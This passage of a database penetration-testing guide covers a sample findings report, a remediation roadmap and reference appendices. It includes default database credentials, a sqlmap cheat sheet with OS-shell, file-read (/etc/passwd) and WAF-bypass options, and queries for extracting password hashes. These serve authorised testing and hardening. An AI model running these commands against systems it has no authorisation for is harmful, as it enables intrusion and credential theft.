   3.2 [CRITICAL] Redis — Unauthenticated Access with RCE
       CVSS v3.1: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
       CWE-306: Missing Authentication for Critical Function
       ...

   3.3 [CRITICAL] MSSQL — SA Account with Weak Password
       CVSS v3.1: 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
       CWE-521: Weak Password Requirements
       ...

   3.4 [HIGH] PostgreSQL — Superuser Credentials Guessable
       CVSS v3.1: 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
       CWE-521: Weak Password Requirements
       ...

   3.5 [HIGH] MySQL — FILE Privilege Grants File System Access
       CVSS v3.1: 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
       CWE-732: Incorrect Permission Assignment for Critical Resource
       ...

   3.6 [MEDIUM] PostgreSQL — SSL Not Enforced
       CVSS v3.1: 5.9 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N)
       CWE-319: Cleartext Transmission of Sensitive Information
       ...

4. RISK MATRIX

   | Finding | CVSS | CWE | Status |
   |---------|------|-----|--------|
   | MongoDB No Auth | 9.8 | CWE-306 | Critical |
   | Redis No Auth + RCE | 9.8 | CWE-306 | Critical |
   | MSSQL Weak SA Password | 9.1 | CWE-521 | Critical |
   | PostgreSQL Weak Password | 8.8 | CWE-521 | High |
   | MySQL FILE Privilege | 7.5 | CWE-732 | High |
   | PostgreSQL No SSL | 5.9 | CWE-319 | Medium |

5. REMEDIATION ROADMAP

   Immediate (24-48 hours):
   - Enable MongoDB authentication
   - Set Redis password and enable protected-mode
   - Change all default/weak database passwords
   
   Short-term (1-2 weeks):
   - Enable SSL/TLS on all database connections
   - Review and restrict FILE privilege in MySQL
   - Implement network segmentation for database tier
   - Enable audit logging on all DBMS instances
   
   Long-term (1-3 months):
   - Implement database activity monitoring (DAM)
   - Deploy database firewall/proxy
   - Establish password rotation policy
   - Conduct follow-up pentest to verify remediation

6. APPENDICES
   A. Full tool output and logs
   B. Network diagrams
   C. Complete list of credentials tested
   D. Timeline of testing activities (UTC ISO 8601)
   E. Hash verification of all evidence files
```

---

## Appendix A: Quick Reference — Ports, Tools, and Default Credentials

| DBMS | Port | Pentest Tools | Default User | Default Password |
|------|------|--------------|-------------|-----------------|
| PostgreSQL | 5432 | psql, pgcli, sqlmap, Metasploit | postgres | postgres |
| MySQL | 3306 | mysql, sqlmap, Metasploit, Hydra | root | (empty) |
| MSSQL | 1433 | sqlcmd, PowerUpSQL, sqlmap, Metasploit | sa | (empty/sa) |
| Oracle | 1521 | sqlplus, ODAT, Metasploit | SYS | change_on_install |
| MongoDB | 27017 | mongosh, NoSQLMap, Metasploit | (none) | (none) |
| Redis | 6379 | redis-cli, Metasploit | (none) | (none) |
| Elasticsearch | 9200 | curl, Metasploit | elastic | changeme |
| CouchDB | 5984 | curl | admin | admin |
| Cassandra | 9042 | cqlsh, nodetool | cassandra | cassandra |

## Appendix B: sqlmap Cheat Sheet

```bash
# Basic injection test
sqlmap -u "URL" --batch

# Full enumeration
sqlmap -u "URL" --dbs --tables --columns --dump --batch

# WAF bypass
sqlmap -u "URL" --tamper=space2comment,between --random-agent --batch

# OS shell
sqlmap -u "URL" --os-shell --batch

# File read
sqlmap -u "URL" --file-read="/etc/passwd" --batch

# Specific DBMS
sqlmap -u "URL" --dbms=postgresql --technique=BUST --level=5 --risk=3 --batch

# Through proxy (Burp)
sqlmap -u "URL" --proxy="http://127.0.0.1:8080" --batch

# From Burp request file
sqlmap -r request.txt --batch

# Crawl and test
sqlmap -u "http://target.com/" --crawl=3 --batch
```

## Appendix C: Post-Exploitation Credential Extraction Commands

```sql
-- PostgreSQL
SELECT rolname, rolpassword FROM pg_authid;

-- MySQL
SELECT user, authentication_string, plugin FROM mysql.user;

-- MSSQL
SELECT name, password_hash FROM sys.sql_logins;

-- Oracle
SELECT username, password, spare4 FROM sys.user$;

-- MongoDB
use admin; db.system.users.find().pretty();

-- Redis
CONFIG GET requirepass
```

## Appendix D: Database Network Segmentation Verification

```bash
# Verify databases are not directly accessible from the internet
# Test from an external IP:
nmap -Pn -sS -p 3306,5432,1433,1521,27017,6379,9200 target-public-ip

# Verify databases are segmented from application tier
# From the app server, test if you can reach OTHER databases:
for port in 3306 5432 1433 27017 6379; do
  nc -zv other-db-host $port 2>&1
done

# Verify management ports are restricted
nmap -Pn -sS -p 7199,9042,9300,5984 target-db-subnet
```

---

## References

- OWASP Testing Guide v4.2 — Testing for SQL Injection, NoSQL Injection
- PTES (Penetration Testing Execution Standard) — Database Testing
- NIST SP 800-123 — Guide to General Server Security
- CIS Benchmarks — PostgreSQL, MySQL, MSSQL, Oracle, MongoDB, Redis
- MITRE ATT&CK — Technique T1190 (Exploit Public-Facing Application), T1078 (Valid Accounts)
- PostgreSQL Documentation — Security chapters, pg_hba.conf reference
- MySQL Reference Manual — Security, Account Management, Pluggable Authentication
- Microsoft SQL Server Security Documentation — Surface Area Configuration
- Oracle Database Security Guide — Authentication, Authorization, Auditing
- MongoDB Security Checklist — mongodb.com/docs/manual/administration/security-checklist
- Redis Security — redis.io/docs/management/security
- sqlmap documentation — sqlmap.org
- PowerUpSQL documentation — github.com/NetSPI/PowerUpSQL
- ODAT documentation — github.com/quentinhardy/odat
